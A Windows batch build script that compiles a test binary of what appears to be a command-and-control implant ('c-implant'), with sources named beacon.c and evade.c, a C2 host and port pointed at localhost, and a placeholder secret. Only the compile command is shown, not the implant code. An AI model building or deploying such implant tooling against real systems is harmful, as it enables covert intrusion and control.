@echo off
REM Runs from within proto/c-implant/. See build-common.cmd for the shared
REM toolchain guard.
call build-common.cmd check
if errorlevel 1 exit /b 1
x86_64-w64-mingw32-gcc -O2 -Wall -o cbeacon-test.exe beacon.c crypto_cng.c curve25519.c sqlite3.c evade.c -lwinhttp -lbcrypt -lpsapi -liphlpapi -lgdiplus -lgdi32 -luser32 -lole32 -DC2_HOST=\"127.0.0.1\" -DC2_PORT=8000 -DSECRET_ID=\"x\" -DSECRET_B64=\"eA==\"
